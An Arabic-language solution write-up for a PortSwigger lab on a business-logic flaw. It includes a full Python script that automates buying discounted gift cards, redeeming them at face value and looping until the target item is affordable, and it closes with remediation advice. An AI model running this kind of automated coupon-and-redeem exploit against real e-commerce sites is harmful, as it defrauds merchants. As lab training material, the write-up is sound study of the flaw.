# [Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)

## **`الهدف`**
استغلال ثغرة لشراء منتج معين `(Lightweight l33t leather jacket).`
## **`خطوات الحل`**
==**`ملاحظة`==** خطوات الحل الرسمي من الـ `PortSwigger` تختلف عن الخطوات المكتوبة هنا لأنه يستعمل خاصية `macro` مع أداة `Burp Intruder`.

إن حل هذا اللاب يعتمد على التوجه لأسفل الصفحة الرئيسية، لنجد حقل فوقه عنوان `Sign up to our newsletter!` وسنكتب أي `email` عشوائي ونضغط `Sign up` وسيظهر لنا رسالة `Use coupon SIGNUP30 at checkout!` ثم نقوم بالدخول إلى حساب `wiener:peter` ونبدأ في شراء `Gift card` بـ `10$` وتطبيق خصم `30%` لنحصل عليه بـ `7$` ونكرر هذا `412` مرة على الأقل لنحصل على مبلغ كافي لنشترى المنتج المطلوب لننتهي من حل اللاب.

ويُمكن تسريع الحل عن طريق خاصية `macro` والتي تُكرر سلسلة من الـ `requests` السابقة ، بالإضافة إلى الـ `Intruder` والذي بالطبع يكون بطئ في النسخة المجانية من `Burp Suite`،
## **`سكريبت الاستغلال`**
**نحتاج فقط إلى تعديل الـ `URL` الخاص باللاب في السكريبت لأنه يتغير كلما يُعاد الإتصال باللاب، ولا تنسى أن تشغيل السكريبت يتم من خلال الـ `Terminal` الخاص بـ `Linux` أو الـ `CMD/PowerShell` الخاص بـ `Windows`.**

**==ملاحظة:== إن هذا السكريبت يعمل تلقائيًا بداية من تسجيل الدخول إلى حساب  `wiener:peter` وحتى مرحلة شراء المُنتج المطلوب `(Lightweight l33t leather jacket)`وظهور رسالة حل اللاب في المتصفح`.**

**السكريبت يعتمد على معرفتك بوجود كود خصم `SIGNUP30` وإلا فكنا سنحتاج إلى إضافة خطوة أولية قبل أو بعد الدخول إلى الحساب لتقوم بالتوجه لأسفل الصفحة الرئيسية للاب وتضع `email` عشوائي في الحقل المكتوب فوقه `Sign up to our newsletter!` ونقوم بعمل `request` للضغط على زر الـ `Sign up` ونسخ الكوبون الذي يظهر في رسالة `Use coupon SIGNUP30 at checkout!` لنجعل السكريبت يستعمله لاحقًا في الحقل عند عملية الشراء للإستفادة من الخصم.**

**السكريبت مُبرمج على القيام بشراء `14 Gift card` فقط في كل مرة لأن اللاب يبدأ والحساب به `100$` ولذلك `100/7=14`، بالطبع يُمكن تطوير الكود لكي يقوم بخطوة اضافية بأن يحسب المبلغ الكلي الموجود في الحساب ويقوم بقسمته على `7` والناتج يكون هو عدد الـ `Gift card` التي يتم شراءها في هذه المرة ويتكرر الأمر كل مرة بشرط أن يتوقف عند `99` لأن اللاب يمنع إضافة أكثر من `99` منتج إلى السلة في المرة الواحدة، ولو أردنا أن يضيف أكثر من `99` في المرة الواحدة فيجب جعل السكريبت يضيف المنتج `99` مرة فقط ثم يذهب إلى السلة ويقوم بعمل `request` لزيادتها من داخل السلة بالضغط على علامة الـ `(+)` **

**بالإضافة إلى أنه لا يوجد رسالة خطأ تظهر إذا كان المال غير كافي لشراء المنتج المطلوب في النهاية `(Lightweight l33t leather jacket)` لأن السكريبت تم كتابته وحساب عدد الدورات الدقيق المطلوب لشراء المُنتج في النهاية لذلك نسيت إضافة إحتمالية رسالة الخطأ، وغالب هذا الأشياء التى لم يتم إضافتها شعرت أنها مُعقدة وفي الغالب كان الكود سيخرب / يتلف لذلك يكفي وجود السكريبت على هذه الحالة.**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
السكريبت الخاص بأتمتة استغلال ثغرة الـ Gift Card في مختبرات PortSwigger.
يشتري 14 بطاقة في كل دورة، ويسترد 14 كود، ويكرر 30 دورة ليصل إلى 420 بطاقة.
"""

import requests
import re
import sys

# ================================================================
# ###_تنبيه_تفعيل_بورب: شيل الـ ### من السطور اللي تحت دي لو عايز تشوف الطلبات في بورب سوت
# ### BURP_PROXIES = {
# ###     "http": "http://localhost:8080",
# ###     "https": "http://localhost:8080"
# ### }
# ================================================================

# ================================================================
# ###_تنبيه_تفعيل_بورب: شيل الـ ### من السطور القادمة إذاأردت تفعيل توجيه وإرسال الطلبات لبورب
# ### import urllib3
# ### urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ================================================================

# ============================================================
# 1. المتغيرات القابلة للتعديل
# ============================================================

TARGET_URL = "https://0aa6000c03e064ee827c607f008c00cb.web-security-academy.net"
USERNAME = "wiener"
PASSWORD = "peter"

# عدد الدورات (30 دورة × 14 بطاقة = 420)
TARGET_CYCLES = 30

# الكمية الثابتة في كل دورة (14)
QUANTITY_PER_CYCLE = 14

GIFT_PRODUCT_ID = "2"
FINAL_PRODUCT_ID = "1"
COUPON_CODE = "SIGNUP30"

# خليها صفحة واحدة عشان السرعة (/my-account)
POSSIBLE_REDEEM_PAGES = ["/my-account"]

# ============================================================
# 2. إعداد الجلسة
# ============================================================

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
}
session = requests.Session()
session.headers.update(headers)

# ============================================================
# 3. دوال الاستخراج (مع التعديل الجديد)
# ============================================================

def extract_csrf(html_text):
    """استخراج توكن CSRF من أي صفحة HTML."""
    match = re.search(r'<input[^>]*name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']', html_text, re.IGNORECASE)
    if not match:
        match = re.search(r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']csrf["\']', html_text, re.IGNORECASE)
    return match.group(1) if match else None

def extract_all_gift_codes(html_text):
    """
    استخراج أكواد بطاقات الهدية فقط من الجدول المخصص.
    - نبحث عن الجدول الذي يحتوي على <th>Code</th>
    - ثم نستخرج كل <td> داخل هذا الجدول فقط
    - نأخذ أول QUANTITY_PER_CYCLE كود (احتياطاً)
    """
    # البحث عن الجدول الذي يحتوي على <th>Code</th>
    table_pattern = r'<table[^>]*>.*?<th[^>]*>Code</th>.*?</table>'
    table_match = re.search(table_pattern, html_text, re.IGNORECASE | re.DOTALL)
    
    if table_match:
        table_html = table_match.group(0)
        # استخراج كل <td> داخل هذا الجدول فقط
        codes = re.findall(r'<td[^>]*>([A-Za-z0-9]{10})</td>', table_html, re.IGNORECASE)
        if codes:
            # نأخذ أول الكمية المطلوبة فقط (احتياطاً)
            return codes[:QUANTITY_PER_CYCLE]
    
    # حل احتياطي: البحث عن أي <td> في الصفحة (لكن نأخذ أول الكمية فقط)
    codes = re.findall(r'<td[^>]*>([A-Za-z0-9]{10})</td>', html_text, re.IGNORECASE)
    if codes:
        return codes[:QUANTITY_PER_CYCLE]
    
    # حل أخير (نادراً ما يستخدم): البحث عن النمط في أي مكان
    return re.findall(r'([A-Za-z0-9]{10})', html_text)[:QUANTITY_PER_CYCLE]

def is_logged_in(html_text):
    return "Log out" in html_text or "/logout" in html_text

# ============================================================
# 4. تسجيل الدخول
# ============================================================

def login(username, password):
    print("[*] Logging in...")
    login_url = f"{TARGET_URL}/login"
    try:
        res = session.get(login_url)
        res.raise_for_status()
        csrf = extract_csrf(res.text)
        if not csrf:
            print("[-] No CSRF token on login page.")
            return False
        data = {"csrf": csrf, "username": username, "password": password}
        res = session.post(login_url, data=data, allow_redirects=True)
        res.raise_for_status()
        if is_logged_in(res.text):
            print("[✓] Logged in successfully.")
            return True
    except Exception as e:
        print(f"[-] Login error: {e}")
    return False

# ============================================================
# 5. شراء المنتج النهائي
# ============================================================

def buy_final_product():
    print("\n[*] Buying final product (ID: 1) to solve lab...")
    # إضافة المنتج
    session.post(f"{TARGET_URL}/cart", data={"productId": FINAL_PRODUCT_ID, "redir": "PRODUCT", "quantity": "1"})
    # جلب التوكن
    res = session.get(f"{TARGET_URL}/cart")
    csrf = extract_csrf(res.text)
    if not csrf:
        print("[-] Could not get CSRF for final checkout.")
        return False
    # شراء
    res = session.post(f"{TARGET_URL}/cart/checkout", data={"csrf": csrf}, allow_redirects=True)
    if "Your order is on its way" in res.text:
        print("[✓] Final product purchased! Lab solved!")
        return True
    else:
        print("[-] Final purchase failed.")
        return False

# ============================================================
# 6. الدورة الرئيسية (الاستغلال السريع)
# ============================================================

def exploit():
    if not login(USERNAME, PASSWORD):
        sys.exit(1)

    for cycle in range(1, TARGET_CYCLES + 1):
        print(f"\n[+] Cycle {cycle}/{TARGET_CYCLES} - Adding {QUANTITY_PER_CYCLE} gift cards...")

        # ---- 1. إضافة 14 بطاقة دفعة واحدة ----
        session.post(f"{TARGET_URL}/cart", data={
            "productId": GIFT_PRODUCT_ID,
            "redir": "PRODUCT",
            "quantity": str(QUANTITY_PER_CYCLE)
        })

        # ---- 2. استخراج توكن الكوبون ----
        res_cart = session.get(f"{TARGET_URL}/cart")
        csrf_coupon = extract_csrf(res_cart.text)

        # ---- 3. تطبيق الكوبون ----
        session.post(f"{TARGET_URL}/cart/coupon", data={
            "csrf": csrf_coupon,
            "coupon": COUPON_CODE
        }, allow_redirects=True)

        # ---- 4. استخراج توكن التشيك أوت ----
        res_cart_after = session.get(f"{TARGET_URL}/cart")
        csrf_checkout = extract_csrf(res_cart_after.text)

        # ---- 5. إتمام الشراء ----
        res_checkout = session.post(f"{TARGET_URL}/cart/checkout", data={
            "csrf": csrf_checkout
        }, allow_redirects=True)

        # ---- 6. استخراج الأكواد (بالدالة المعدلة) ----
        gift_codes = extract_all_gift_codes(res_checkout.text)
        print(f"[->] Extracted {len(gift_codes)} gift codes from this cycle.")

        if not gift_codes:
            print("[-] No codes found! Skipping redemption.")
            continue

        # ---- 7. استرداد كل الأكواد ----
        # جلب توكن الاسترداد من /my-account
        res_redeem_page = session.get(f"{TARGET_URL}/my-account")
        csrf_redeem = extract_csrf(res_redeem_page.text)
        if not csrf_redeem:
            print("[-] Could not get redeem token. Trying /cart...")
            res_redeem_page = session.get(f"{TARGET_URL}/cart")
            csrf_redeem = extract_csrf(res_redeem_page.text)
            if not csrf_redeem:
                print("[-] Failed to get redeem token. Skipping cycle.")
                continue

        # استرداد كل كود على حدة
        for idx, code in enumerate(gift_codes, 1):
            session.post(f"{TARGET_URL}/gift-card", data={
                "csrf": csrf_redeem,
                "gift-card": code
            })
            if idx % 5 == 0:  # نطبع كل 5 أكواد عشان ما يطولش الناتج
                print(f"    Redeemed {idx}/{len(gift_codes)} codes...")

        print(f"[✓] Cycle {cycle} completed. All {len(gift_codes)} codes redeemed.")

    # بعد الانتهاء من جميع الدورات، نشتري المنتج النهائي
    buy_final_product()
    print("\n[Done] Exploitation finished.")

# ============================================================
# 7. نقطة الدخول
# ============================================================

if __name__ == "__main__":
    exploit()
```
ولتشغيل السكريبت تحتاج إلى نسخ الكود إلى برنامج أو أداة نصوص مثل `Notepad` وحفظه بإمتداد `py` بأى إسم عشوائي، كمثال: `test` وتشغيله بإستخدام إحدي الأوامر التالية من داخل الـ `Terminal`
```shell
python test.py
أو
python3 test.py
```
## **`ترقيع الثغرة`**
يجب منع تطبيق أكواد الخصم على الـ `Gift card`.

ويُفضل عدم عرض كود الخصم في الصفحة مباشرة بعد الشراء بل يتم إرساله إلى الـ `email` الخاص بالمستخدم. 

ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting.`
